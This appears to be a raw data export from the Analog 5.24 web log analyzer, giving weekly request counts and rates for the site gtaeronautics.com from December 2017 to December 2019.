x	VE	analog 5.24
x	HN	gtaeronautics.com
W	Rr	1704	0.177	2019	12	01
W	Rr	1178	0.122	2019	11	24
W	Rr	1697	0.176	2019	11	17
W	Rr	1510	0.157	2019	11	10
W	Rr	1383	0.144	2019	11	03
W	Rr	1309	0.136	2019	10	27
W	Rr	1473	0.153	2019	10	20
W	Rr	1519	0.158	2019	10	13
W	Rr	1485	0.154	2019	10	06
W	Rr	1416	0.147	2019	09	29
W	Rr	1499	0.156	2019	09	22
W	Rr	1652	0.171	2019	09	15
W	Rr	1710	0.177	2019	09	08
W	Rr	1485	0.154	2019	09	01
W	Rr	1689	0.175	2019	08	25
W	Rr	1315	0.136	2019	08	18
W	Rr	1619	0.168	2019	08	11
W	Rr	1558	0.162	2019	08	04
W	Rr	1360	0.141	2019	07	28
W	Rr	1191	0.124	2019	07	21
W	Rr	1730	0.180	2019	07	14
W	Rr	1299	0.135	2019	07	07
W	Rr	1339	0.139	2019	06	30
W	Rr	1592	0.165	2019	06	23
W	Rr	1497	0.155	2019	06	16
W	Rr	1450	0.151	2019	06	09
W	Rr	1555	0.161	2019	06	02
W	Rr	1289	0.134	2019	05	26
W	Rr	1863	0.193	2019	05	19
W	Rr	1385	0.144	2019	05	12
W	Rr	1553	0.161	2019	05	05
W	Rr	1655	0.172	2019	04	28
W	Rr	1282	0.133	2019	04	21
W	Rr	1503	0.156	2019	04	14
W	Rr	1623	0.168	2019	04	07
W	Rr	1715	0.178	2019	03	31
W	Rr	1882	0.195	2019	03	24
W	Rr	1464	0.152	2019	03	17
W	Rr	1381	0.143	2019	03	10
W	Rr	1627	0.169	2019	03	03
W	Rr	1773	0.184	2019	02	24
W	Rr	1669	0.173	2019	02	17
W	Rr	1483	0.154	2019	02	10
W	Rr	1391	0.144	2019	02	03
W	Rr	1797	0.187	2019	01	27
W	Rr	1963	0.204	2019	01	20
W	Rr	2029	0.211	2019	01	13
W	Rr	1696	0.176	2019	01	06
W	Rr	1526	0.158	2018	12	30
W	Rr	1226	0.127	2018	12	23
W	Rr	1442	0.150	2018	12	16
W	Rr	1936	0.201	2018	12	09
W	Rr	1809	0.188	2018	12	02
W	Rr	1295	0.134	2018	11	25
W	Rr	1820	0.189	2018	11	18
W	Rr	1802	0.187	2018	11	11
W	Rr	0	0.000	2018	11	04
W	Rr	1473	0.153	2018	10	28
W	Rr	1106	0.115	2018	10	21
W	Rr	1427	0.148	2018	10	14
W	Rr	1214	0.126	2018	10	07
W	Rr	1168	0.121	2018	09	30
W	Rr	1420	0.147	2018	09	23
W	Rr	1197	0.124	2018	09	16
W	Rr	1388	0.144	2018	09	09
W	Rr	1320	0.137	2018	09	02
W	Rr	1246	0.129	2018	08	26
W	Rr	1214	0.126	2018	08	19
W	Rr	1366	0.142	2018	08	12
W	Rr	1195	0.124	2018	08	05
W	Rr	1346	0.140	2018	07	29
W	Rr	1374	0.143	2018	07	22
W	Rr	1508	0.157	2018	07	15
W	Rr	1522	0.158	2018	07	08
W	Rr	909	0.094	2018	07	01
W	Rr	1444	0.150	2018	06	24
W	Rr	2682	0.278	2018	06	17
W	Rr	1365	0.142	2018	06	10
W	Rr	1329	0.138	2018	06	03
W	Rr	1275	0.132	2018	05	27
W	Rr	1392	0.144	2018	05	20
W	Rr	1321	0.137	2018	05	13
W	Rr	1527	0.158	2018	05	06
W	Rr	1517	0.157	2018	04	29
W	Rr	0	0.000	2018	04	22
W	Rr	1364	0.142	2018	04	15
W	Rr	1712	0.178	2018	04	08
W	Rr	0	0.000	2018	04	01
W	Rr	1543	0.160	2018	03	25
W	Rr	1342	0.139	2018	03	18
W	Rr	2429	0.252	2018	03	11
W	Rr	0	0.000	2018	03	04
W	Rr	1366	0.142	2018	02	25
W	Rr	1308	0.136	2018	02	18
W	Rr	1439	0.149	2018	02	11
W	Rr	1731	0.180	2018	02	04
W	Rr	0	0.000	2018	01	28
W	Rr	1434	0.149	2018	01	21
W	Rr	1578	0.164	2018	01	14
W	Rr	1471	0.153	2018	01	07
W	Rr	1246	0.129	2017	12	31
W	Rr	1033	0.107	2017	12	24
